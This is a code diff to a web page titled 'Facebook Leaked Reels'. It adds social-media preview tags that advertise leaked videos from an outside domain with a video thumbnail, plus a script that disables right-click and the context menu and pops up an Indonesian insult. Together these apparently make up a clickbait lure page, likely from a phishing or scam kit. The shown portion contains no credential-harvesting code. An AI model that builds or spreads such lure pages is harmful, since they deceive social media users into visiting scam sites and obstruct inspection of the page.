@@ -8,7 +8,22 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width,initial-scale=1.0">
   <title>Facebook Leaked Reels</title>
+<meta name="Follow my social media or watch my live broadcast" content="">
 
+<!-- Facebook Meta Tags -->
+<meta property="og:url" content="https://bijiuntadot.com">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Facebook Leaked Reels">
+<meta property="og:description" content="Follow my social media or watch my live broadcast">
+<meta property="og:image" content="https://images.sxccdn.com/videos/981482/288/thumbnail.0000012.jpg">
+
+<!-- Twitter Meta Tags -->
+<meta name="twitter:card" content="summary_large_image">
+<meta property="twitter:domain" content="https://bijiuntadot.com">
+<meta property="twitter:url" content="https://bijiuntadot.com">
+<meta name="twitter:title" content="Facebook Leaked Reels">
+<meta name="twitter:description" content="Follow my social media or watch my live broadcast">
+<meta name="twitter:image" content="https://images.sxccdn.com/videos/981482/288/thumbnail.0000012.jpg">
 <script>
 window.onload = function () {
   setTimeout(function () {
@@ -334,6 +349,30 @@ window.onload = function () {
       }
     }
   </script>
+  <script type="text/javascript">
+  var message="PALA BAPAK KAU";
+  function clickIE4(){
+    if(event.button==2){
+      alert(message);
+      return false;
+    }
+  }
+  function clickNS4(e){
+    if(document.layers||document.getElementById&&!document.all){
+      if(e.which==2||e.which==3){
+        alert(message);
+        return false;
+      }
+    }
+  }
+  if(document.layers){
+    document.captureEvents(Event.MOUSEDOWN);
+    document.onmousedown=clickNS4;
+  }else if(document.all&&!document.getElementById){
+    document.onmousedown=clickIE4;
+  }
+  document.oncontextmenu=new Function("alert(message);return false");
+</script>
 </body>
 
 </html>
